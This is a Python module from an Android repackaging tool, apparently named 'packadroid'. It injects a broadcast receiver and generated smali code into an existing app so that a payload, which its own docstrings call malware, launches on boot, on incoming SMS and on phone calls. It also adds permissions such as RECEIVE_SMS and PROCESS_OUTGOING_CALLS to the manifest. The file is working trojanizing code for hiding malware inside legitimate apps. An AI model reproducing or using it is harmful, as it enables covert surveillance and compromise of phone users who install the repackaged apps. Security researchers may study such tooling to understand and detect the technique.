from packadroid.manifestmanager import manifest_changer
from packadroid.hookmanager.hook import Hook
from collections import defaultdict
import xml.etree.ElementTree as ET


#gloab variables
receiver_count = 0


def __fix_manifest(manifest_path, package, actions):
    """
    Fixes the AndroidManifest.xml dependent on the specified hooks. Adds needed permissions and needed receivers to the Manifest.

    :param manifest_path: path to the Android Manifest of the original apk
    :type manifest_path: str

    :param package: The package name where the smali file of the Broadcastreceiver will be stored later
    :type package: str

    :param actions: These are the supported Broadcasts
    :type package: list

    :return 
    """
    global receiver_count
    # possible that we need more than one BroadcastLauncher -> count them
    broadcast_class = "BroadcastLauncher" + str(receiver_count)
    receiver_count += 1


    # generate receiver:
    rec = ('        <receiver android:name="' + package.replace("/",".") + '.' + broadcast_class +'">\n            <intent-filter>\n').replace("..", ".")
    
    #there might be additional permissions needed for accessed specific Broadcasts
    permissions = []
    for a in actions:
        if a == "on_power_connected":
            rec += '                <action android:name="android.intent.action.ACTION_POWER_CONNECTED"/>\n'
        if a == "on_power_disconnected" :
            rec += '                <action android:name="android.intent.action.ACTION_POWER_DISCONNECTED"/>\n'
        if a == "on_boot_completed":
            rec += '                <action android:name="android.intent.action.BOOT_COMPLETED"/>\n'
            permissions.append("android.permission.RECEIVE_BOOT_COMPLETED")
        if a == "on_receive_sms":
            rec += '                <action android:name="android.provider.Telephony.SMS_RECEIVED"/>\n'
            permissions.append("android.permission.RECEIVE_SMS")
        if  a == "on_incoming_call":
            rec += '                <action android:name="android.intent.action.PHONE_STATE"/>\n'
            permissions.append("android.permission.READ_PHONE_STATE")
        if a == "on_outgoing_call":
            rec += '                <action android:name="android.intent.action.NEW_OUTGOING_CALL"/>\n'
            permissions.append("android.permission.PROCESS_OUTGOING_CALLS")

    rec += '            </intent-filter>\n        </receiver>'

    # add the receiver to the manifest
    manifest_changer.add_receiver(manifest_path, rec)
    # add the permissions to the manifest
    manifest_changer.add_permissions_to_manifest(manifest_path, permissions)

    #method __inject_smali needs the class name
    return broadcast_class


def __inject_smali(payload_dec_path, filename, package, classname, methodname):
    """
    Generates the smali code for the broadcast receiver. Furthermore, this method makes a static call to the payload based on given package, classname and methodname
    
    :param payload_dec_path: Path to the decompiled payload
    :type payload_dec_path: str

    :param filename: Name of the class which was specified in the manifest
    :type filename: str

    :param package: The package where the broadcastreceiver is placed.
    :type package: str

    :param classname: The class in the payload (malware) on which the static method is called
    :type classname: str

    :param methodname: The static method which is called to launch the payload (malware)
    :type methodname: str

    :return
    pass
    """
    # this section is generating a Broadcast recei
    smali = (".class public L" + package.replace(".","/") + "/" + filename + ";\n").replace("//", "/")
    # remove from line 2: .source "BroadcastLauncher.java"
    smali += """.super Landroid/content/BroadcastReceiver;


# direct methods
.method public constructor <init>()V
    .locals 0

    .prologue
    .line 8
    invoke-direct {p0}, Landroid/content/BroadcastReceiver;-><init>()V

    return-void
.end method


# virtual methods
.method public onReceive(Landroid/content/Context;Landroid/content/Intent;)V
    .locals 0
    .param p1, "context"    # Landroid/content/Context;
    .param p2, "intent"    # Landroid/content/Intent;\n"""

    # add the static call to the payload
    # The parameter is always the context since a payload (malware does not need any other parameters of the original application)
    smali += ("    invoke-static {p1}, L" +  classname.replace(".", "/") + ";->" + methodname + "(Landroid/content/Context;)V\n").replace("//","/")

    smali += """    .prologue
    .line 12
    return-void
.end method"""

    # Places the smali file to the decompiled payload. All the smali files are copied by the packer    
    with open(payload_dec_path + "/smali/" + package.replace(".","/") + "/" + filename + ".smali","w") as f:
        f.write(smali)




def inject_broadcast_receiver_hooks(hooks, original_apk_path):
    """
    Injects different hooks into the original application. These hooks are launched on the intents given in the parameters. The broadcast hooks are generated based on a given list of object hooks
    
    :param hooks: list of hook objects
    :type hooks: list

    :param original_apk_path: path to the original apl
    :type original_apk_path: str

    :return
    """

    hook_overview = defaultdict(list)
    for h in hooks:
        if h.get_type() != "broadcast_receiver":
            print("Broadcast hook got hook object which is no broadcast_receiver")
            continue
        #class includes full package
        key = (h.get_class(), h.get_method(), h.get_payload_apk_path(), h.get_payload_dec_path())
        hook_overview[key].append(h.get_location())

    original_manifest_path = (original_apk_path + "/" + "AndroidManifest.xml").replace("//", "/")
    for h in hook_overview.items():
        payload_package = ".".join(h[0][0].split(".")[:-1])
        filename = __fix_manifest(original_manifest_path, payload_package, h[1])
        __inject_smali(h[0][3], filename, payload_package, h[0][0], h[0][1])